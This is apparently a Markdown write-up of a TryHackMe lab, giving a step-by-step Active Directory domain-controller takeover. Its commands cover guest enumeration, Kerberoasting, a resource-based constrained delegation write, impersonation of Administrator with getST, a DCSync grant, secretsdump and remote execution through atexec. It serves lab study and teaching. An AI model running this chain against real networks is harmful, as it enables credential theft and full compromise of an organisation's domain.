# TryHackMe — Operation Endgame (path notes)

**Type:** Hard AD DC · Domain: `thm.local` · DC: `AD` (`AD.THM.LOCAL`) · Lab only.
Room: https://tryhackme.com/room/operationendgame
Redacted: flag, cracked password, and NTDS hashes are not stored here.

## One-line path (lab)

guest (empty password) → BloodHound / LDAP → **Kerberoast `CODY_ROY` (`-no-pass`)**
→ crack → guest has **GenericWrite on the DC computer `AD$`**
→ **RBCD**: allow `CODY_ROY` (already has an SPN) to act on `AD$`
→ `getST -spn ldap/AD.THM.LOCAL -impersonate Administrator`
→ grant **DCSync** → `secretsdump` → **C$ / atexec** (no WinRM).

## Steps (high level)

1. **Recon** — `nmap`: 53/80/88/135/139/389/443/445/464/593/636/3268/3269/3389/9389.
   IIS on 80, ADCS-ish cert on 443, no 5985 → **WinRM is closed**.
2. **Unauth** — null bind denied; **guest with empty password works**:
   `nxc smb {{DC}} -u guest -p '' --shares` (IPC$ READ only, but the account binds).
3. **BloodHound** — collect as guest. `rusthound-ce -d thm.local --ldapip {{DC}} -u guest -p ''`
   (or `bloodhound.py`). Cypher: Kerberoastable users → **`CODY_ROY`** (SPN `HTTP/server.secure.com`).
4. **Kerberoast from guest** — `GetUserSPNs.py thm.local/guest -no-pass -request` → `$krb5tgs$23$…`.
   Crack `-m 13100`. Do this **before** spraying or RID-brute — guest already unlocks it.
5. **Writable objects** — guest has an oversized ACL: `get writable` shows
   **GenericWrite on `CN=AD,OU=Domain Controllers,…` (the DC machine account `AD$`)**.
   `bloodyAD` refuses an empty password by default → see empty-password note below.
6. **RBCD with an existing SPN** — because `CODY_ROY` **already has an SPN**, no
   `FAKE$` / MAQ is needed. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on `AD$`
   to allow `CODY_ROY`.
7. **S4U → LDAP ticket** — `getST.py -spn ldap/AD.THM.LOCAL -impersonate Administrator`
   as `CODY_ROY`. Target `ldap/` (DCSync needs LDAP), not `cifs/`. `export KRB5CCNAME=…`.
8. **Grant DCSync** — as Administrator over Kerberos, add the two replication ACEs to
   `CODY_ROY`: `bloodyAD --host AD.THM.LOCAL -k add dcsync cody_roy`.
9. **DCSync** — `secretsdump.py -just-dc-user Administrator …/cody_roy@{{DC}}`.
10. **Flag (no WinRM)** — `smbclient.py` to `C$` or `atexec.py` with the Administrator
    hash. `evil-winrm` fails — 5985 is not open.

## Empty-password (guest) note

- Impacket accepts guest with **`-no-pass`** (`GetUserSPNs.py … -no-pass`,
  `getST.py … 'THM.LOCAL/cody_roy:<pass>'`) — first-class, not an error.
- **`bloodyAD` refuses `-p ''`** on stock builds. Supported options:
  - use the Impacket twin for the RBCD write —
    `rbcd.py -delegate-to 'AD$' -delegate-from CODY_ROY -action write -no-pass thm.local/guest -dc-ip {{DC}}`; or
  - once you own `CODY_ROY` (cracked), drive `bloodyAD` with that cred / `-k`.
- After the S4U ticket, `bloodyAD` runs Kerberos-only (`-k`, no `-p`) as Administrator.

## Defaults this room breaks (patch into cards)

- **No WinRM** → `smbclient.py` / `atexec.py` / `wmiexec.py`, never `evil-winrm`. (`shells.md`, `impacket.md`)
- **Kerberoast before spray** when guest works. (`impacket.md`, `steps.md` §07)
- **RBCD principal can be an existing Kerberoastable user** — SPN already set, skip MAQ+`FAKE$`. (`tickets.md`)
- **getST target = `ldap/` for DCSync**, `cifs/` for C$. (`tickets.md`, `impacket.md`)
- **guest empty password is first-class**; `bloodyAD -p ''` is the tool limitation, not a dead end. (`enum.md`, `bloodyad.md`)

## Techniques to card

guest/empty-password · BloodHound/rusthound-ce · Kerberoast `-no-pass` · GenericWrite on DC computer
· RBCD (existing SPN) · S4U getST `ldap/` · WriteDACL→DCSync grant · DCSync · smbclient/atexec (no WinRM)

## GOTAD skill mapping

`unauth` → `bloodhound` → `kerberoast` → `acl` → `rbcd` → `delegation` → `dcsync`
